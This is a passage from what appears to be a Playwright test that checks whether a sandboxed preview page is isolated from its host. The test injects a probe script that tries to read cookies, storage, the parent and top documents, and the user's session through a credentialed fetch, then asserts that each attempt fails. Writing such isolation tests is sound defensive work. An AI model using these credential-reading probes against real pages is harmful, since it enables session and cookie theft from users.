  exitTest(pageTestTitles.noOrigin, async ({ page, otherHost, refusals }) => {
    const session = `${apiOrigin}/api/v1/me`;
    const asked: string[] = [];
    page.on("request", (request) => {
      // The interface asks for the session itself. What counts is a request out of a frame.
      if (request.url() === session && request.frame() !== page.mainFrame()) {
        asked.push(request.url());
      }
    });

    const view = await openPage(page, {
      script: [
        `const read = (name, get) => { try { document.body.setAttribute(name, String(get())); } catch (error) { document.body.setAttribute(name, "threw " + error.name); } };`,
        `read("data-origin", () => self.origin);`,
        `read("data-cookie", () => document.cookie);`,
        `read("data-storage", () => localStorage.length);`,
        `read("data-session-storage", () => sessionStorage.length);`,
        `read("data-databases", () => indexedDB.open("rows"));`,
        `read("data-parent", () => parent.document.title);`,
        `read("data-top", () => top.document.cookie);`,
        `fetch(${JSON.stringify(session)}, { credentials: "include" }).then((answer) => document.body.setAttribute("data-session", String(answer.status)), (error) => document.body.setAttribute("data-session", "failed " + error.name));`
      ].join("\n")
    });
    await expectPageRan(page);
    const body = view.locator("body");

    // The Page's own files loaded and its stylesheet applies: it is not held by being broken.
    await expect(view.locator("#page-title")).toHaveCSS("color", "rgb(1, 2, 3)");
    await expect(body).toHaveAttribute("data-origin", "null");
    await expect(body).toHaveAttribute("data-cookie", "threw SecurityError");
    // The shim exposes only this preview's empty state, never host browser storage.
    await expect(body).toHaveAttribute("data-storage", "0");
    await expect(body).toHaveAttribute("data-session-storage", "threw SecurityError");
    await expect(body).toHaveAttribute("data-databases", "threw SecurityError");
    await expect(body).toHaveAttribute("data-parent", "threw SecurityError");
    await expect(body).toHaveAttribute("data-top", "threw SecurityError");
    // The instance's own API is another host to a Page: the policy names none.
    await expect(body).toHaveAttribute("data-session", "failed TypeError");
    await expect
      .poll(() => refusals.filter((text) => text.includes(`"connect-src 'none'"`)))
      .toHaveLength(1);
    expect(asked).toEqual([]);
    expect(otherHost.requests).toEqual([]);
  });
});
